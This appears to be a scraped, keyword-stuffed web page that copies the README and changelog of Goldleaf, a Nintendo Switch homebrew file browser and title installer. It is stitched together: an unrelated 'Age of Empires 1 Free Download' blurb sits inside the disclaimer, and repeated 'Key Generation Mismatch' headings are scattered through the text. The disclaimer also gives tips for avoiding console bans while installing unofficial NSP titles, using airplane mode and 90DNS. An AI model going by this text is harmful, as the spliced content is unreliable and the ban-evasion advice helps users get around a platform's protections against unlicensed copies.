Example usage: nsz -level 18 -C title1.nsp title2.nsp title3.nsp will generate title1.nsz title2.nsz title3.nsz This tool was only tested with base games, updates and DLCs.</p><p> Goldleaf is multipurpose homebrew tool for Nintendo Switch.</p><p> If you are looking for Tinfoil, this is Tinfoil's safer and way more extended evolution.</p><p> Goldleaf has a very similar concept to FBI, which is a similar tool for Nintendo 3DS homebrew.</p><p><strong>These are its main features:</strong></p><ul><li><strong>SD card browser:</strong> A simple but fully equiped file browser for the SD card, supporting several file formats (such as NSP, NRO, NACP, NXTheme, JPEG, tickets..), and with support for copying, pasting, renaming, deleting and creating files and directories. </li><li><strong>Console memory browser:</strong> Same browser but to be used with NAND partitions, which also warns when writing or deleting content as it can be dangerous. </li><li><strong>Remote PC browser:</strong> Via this feature, one can browse a PC's drives like any other filesystem, connected by a USB-C cable. </li><li><strong>Content manager:</strong> Browse any kind of content in your SD card, console memory or game cartridge. You can browse all the NCAs, and as title options, you can remove the content, or export it as a NSP. NAND SYSTEM contents (system titles or contents) aren't allowed to be deleted. Invidual contents such as updates or DLC can be removed individually. You have also the option to remove unused tickets or tickets belonging to contents, plus the options to reset launch version (in order to remove the update nag) or to export base, updates or DLCs to installable NSPs. </li><li><strong>Web browser</strong> (console's web-applet): Using the console's web applets, Goldleaf allows to search and navigate through web pages. However, this can only be accessed if launched from the forwarder for technical reasons. </li><li><strong>User account manager:</strong> Select a user account, and easily change things as the user's nickname or even delete it. Via the file browsers you can replace a user's icon with a JPEG image, but it can be a risky action. The icon needs to be a valid JPEG, with 256x256 dimensions. Goldleaf checks if the icon is valid to replace the other one. Linked accounts can also be unlinked (locally). </li><li><strong>Console or Goldleaf settings:</strong> In this menu you can manage the console's update (view it's version or dump it as a directory installable with Choi or a NSP), and pending update in case it's present (auto-downloaded updates, which can also be viewed, dumped or deleted) </li></ul><p> Among all this features, Goldleaf is a very intuitive tool, with a fancy UI, and fully translated into 5 different languages: English, Spanish, German, French, Italian and Dutch.</p><p><strong>Common controls</strong></p><ul><li> (LR-stick / R-stick / D-pad) Move through the current menu </li><li> (ZL / ZR) Show a dialog to shut down or reboot the console. </li><li> (Plus / +) Show a dialog with this information. </li></ul><img src='https://www.dekazeta.net/foro/uploads/monthly_2020_01/Goldleaf.7.thumb.jpg.95b94b26545ab22eaf834e0dbbbbef9d.jpg' alt='Mismatch' title='Mismatch'><p><strong>NRO-only controls</strong></p><ul><li> (Minus / -) Exit the application in order to return to hbmenu. </li></ul><p><strong>Disclaimer</strong></p><p><strong>NSP installs</strong></p><p>Story Of AOE 1Age Of Empires 1 Free Download PC Game Comes With 4 Different Ages.

The Player Should Control Several Units In The Game Play. You Have To Build Various Buildings And Structures In The Locations.</p><p> Always keep in mind that installing NSPs can be a very easy way to get banned. If you use airplane mode and special DNSs like 90DNS, there is a smaller chance to get banned.</p><p><strong>NEVER</strong> install untrusted NSPs. Goldleaf doesn't do any special verification, so please make sure that what you decide to install was obtained from trustworthy sources.</p><p><strong>Tickets</strong></p><p> Tickets represent a game purchase, but technically speaking, you can't boot a title if the ticket isn't present (in case the title requires the ticket).</p><p> NSPs which don't have (nor require) a ticket are 'standard crypto' NSPs. Standard-crypto titles aren't offical (usually reconverted content to avoid importing tickets).</p><p> Goldleaf will display whether a ticket is present or not, and if so, it's titlekey. Titlekeys are required to decrypt and access titles' content which require a ticket. Otherwise, they are undecryptable, hence unlaunchable by the system.</p><p> TL;DR: Always try to avoid untrusted NSPs, and if you go ahead and install CDN NSPs with tickets, avoid going online, or use special tools such as 90DNS, or you'll be banned for sure.</p><p><strong>Quark and remote PC</strong></p><h3 id='key-generation-mismatch-goldleaf'>Key Generation Mismatch Goldleaf</h3><p>Quark is a PC tool, with a fancy UI and made in Java, in order to help Goldleaf with the remote PC option. It should work on Windows, Linux or Mac.</p><p> Only requirement for Quark to work is JRE/JDK 8u60 or higher.</p><p> One time setup:</p><h3 id='key-generation-mismatch-gold-leaf-073'>Key Generation Mismatch Gold Leaf 0.7.3</h3><img src='https://i.redd.it/vuf8t6gqq2o31.jpg' alt='Key Generation Mismatch Goldleaf 0.7.3' title='Key Generation Mismatch Goldleaf 0.7.3'><ol><li> Download Zadig</li><li> Open Goldleaf and connect your Switch via USB with your PC </li><li> Open Zadig </li><li> Click 'Options' and select 'List all devices' </li><li> Select the Switch from the drop-down menu </li><li> Change the driver (right next to the green arrow) to 'libusbK' </li><li> Click on the button below 'Install WCID Driver' or 'Replace Driver' </li><li> Done. Now you can use Goldleaf and Quark to directly access your PC! </li></ol><p><strong>Note: </strong>To use it correctly, make sure you open Goldleaf and connect the Switch with your PC before you launch Quark. Nevertheless, Quark will warn when USB connection is gone or no USB connection is found.</p><p><strong>Forwarding</strong></p><p> Goldleaf is released along with a NSP, in order to launch Goldleaf as an installed title, and take advantage of extra RAM and features such as web browsing.</p><p> The NSP is a forwarder since 0.6, what means that, instead of having Goldleaf's source inside the NSP, it simply loads the NRO from the SD card, meaning that only the NRO should be updated instead of having to reinstall the NSP.</p><p> Goldleaf's forwarding code tries to locate Goldleaf (Goldleaf.nro) in sd:/switch/ and sd:/switch/Goldleaf/. If it isn't found, an error message will be displayed.</p><p><strong>Settings</strong></p><p> Goldleaf supports the customization of colors, assets and other options via a JSON file located at Goldleaf's folder: sd:/switch/Goldleaf/settings.json.</p><p> If a certain attribute isn't present Goldleaf will use default values. For colors, Goldleaf will initially load default light/dark themes according to the console's theme color, and later, colors present in the JSON will be used instead of default theme ones.</p><p><strong>Notes</strong></p><p> Via RomFs replacement, when Goldleaf tries to locate, for instance, romfs:/FileSystem/FileDataFont.ttf resource font, if romfsReplace is true and romfsReplacePath is, for instance, /switch/Goldleaf/testromfs, Goldleaf will look if sd:/switch/Goldleaf/testromfs/FileSystem/FileDataFont.ttf exists and use it if so, otherwise will use RomFs's one.</p><h3 id='goldleaf-key-generation-mismatch'>Goldleaf Key Generation Mismatch</h3><p> So, via this configurations, UI's images, resources, element sizes and even translations (using custom JSON translations) can be used, plus some more assets which will be added in future updates.</p><p><strong>Known bugs</strong></p><ul><li> On Atmosphère and SX OS, exiting Goldleaf via HOME menu (as a NRO) seems to crash the system on 7.x firmwares due to a weird USB bug present on that specific versions. Any non-7.x firmware doesn't have this issue. </li><li> Apparently, after browsing (more than 4 times?) and then browsing (specific?) empty directories crashes Goldleaf. This issue is strangely common and needs to be looked into. </li></ul><p><strong>Credits and support</strong></p><p> The main concepts of Goldleaf are and have been developed by me (XorTroll), but without the effort and support of many others, this project wouldn't have been a thing:</p><ul><li> Adubbz and all the (old) Tinfoil contributors, for their huge work with title installing. </li><li> C4Phoenix, for his awesome work doing this project's logo, and the GIF displayed when launching the installed forwarder. </li><li> All the graphics except Goldleaf's logo (see credit above) were grabbed from Icons8. </li><li> 2767mr, for all the support given in Goldtree. </li><li> developer.su for NS-USBloader, which helped a lot on the development of Quark, mainly on the usage of usb4java and the base of a multi-platform JavaFX Java project. </li><li> Simon for his libusbK implementation for C#, which has made Goldtree client possible. </li><li> shchmue and blawar for the system to get tickets from system save data without breaking anything, found in Lockpick. </li><li> Translators: unbranched and exelix for Italian, tiliarou and FuryBaguette for French, and LoOkYe and C4Phoenix for German. </li><li> All the testers, for reporting bugs and helping a lot with the project's development. </li></ul><h2>Que novedades incluye la versión <span>0.8</span></h2><p>Released </p><p><strong>0.8</strong></p><ul><li> General <ul><li> Updated to latest libnx. This simplifies the code, and fixes potential issues? old libnx could have had. </li><li> Some parts of the code were rewritten or simplified, in order to try to improve Goldleaf's performance. A lot of nonsense or unused code was removed, and much stuff was simplified thanks to latest libnx changes. </li><li> Removed forwarder support. There are less ban-baity ways to launch homebrew as applications (via uLaunch or using Atmosphere's title override) </li></ul></li><li> Application <ul><li> Fixed a bug where deleting the currently selected user would leave Goldleaf in a buggy state (because it would still think that the user is valid) </li><li> Now amiibo dumping is done via 'debug' amiibo/NFP services. Since emuiibo intercepts user (and soon system) services, using debug services means Goldleaf will be able to dump real amiibos even if emuiibo is activated. </li><li> Custom exception/crash handling: now, when a crash happens (usually segmentation faults), it won't cause a fatal error, Goldleaf will instead save a simple crash report to /reports and exit normally. Same thing for fatal crashes, which also log fatal reports there. </li><li> Now rebooting will reboot to RCM/payload, same way as if you rebooted from HOME menu's power menu. </li><li> The web browser system was improved, adding now a custom menu, and the possibility to save a page as a bookmark after having browsed it. </li><li> Added an integrated emuiibo v0.4.0 manager! This simplifies a lot using virtual amiibos: <ul><li> Unlike other managers, Goldleaf checks the amiibo and attempts to get its picture from AmiiboAPI, otherwise displays a default icon. </li><li> You can change emuiibo's status (on, on for one use and off) and select a certain amiibo to use. </li></ul></li></ul></li><li> Quark / USB </li><li> Quark's target version was changed to Java 9 or higher, since trying to support Java 8 too made it complicated to get it working. </li><li> USB system was changed, and it won't work with previous versions (latest Goldtree for instance, which supported up to 0.7.3) </li><li> Fixed file/directory copying between different filesystems (SD and PC in this case), so it should work fine now <span>?</span></li><li> Now Goldleaf takes advantage of string descriptors on its USB communications: <ul><li> Goldleaf's USB will have 'Goldleaf' as the product string, so Quark can identify if the homebrew detected is actually Goldleaf. This particular change kills compatibility with any previous versions. </li><li> Goldleaf also sets it's version as the serial number descriptor, so Quark can use it. Development builds have '-dev' after the version ('0.8.0-dev', for instance), which will make Quark warn about its possible unstability. </li></ul></li><li> Quark now displays the time anything was logged in the log box. That way, one can easily identify if USB connection is still working, for instance, with installs or long file copying. </li></ul><p><strong>0.7.3</strong></p><ul><li> General <ul><li> Now the console's supported key generation is read from BOOT0 (it was hardcoded manually before) - this means that Goldleaf won't have to be updated in new console updates to fix key mismatch errors! Thus, 9.0.1 support was also fixed. </li></ul></li><li> Updates <ul><li> Goldleaf's updater is broken on 0.7.2 (and probably lower versions). PLEASE, DON'T USE IT TO UPDATE TO 0.7.3!. Luckily, it is fixed for this version, so next versions (0.7.x, 0.8..) should download fine when they get released soon. </li><li> Pending update detection was barely broken, but has been fixed too.
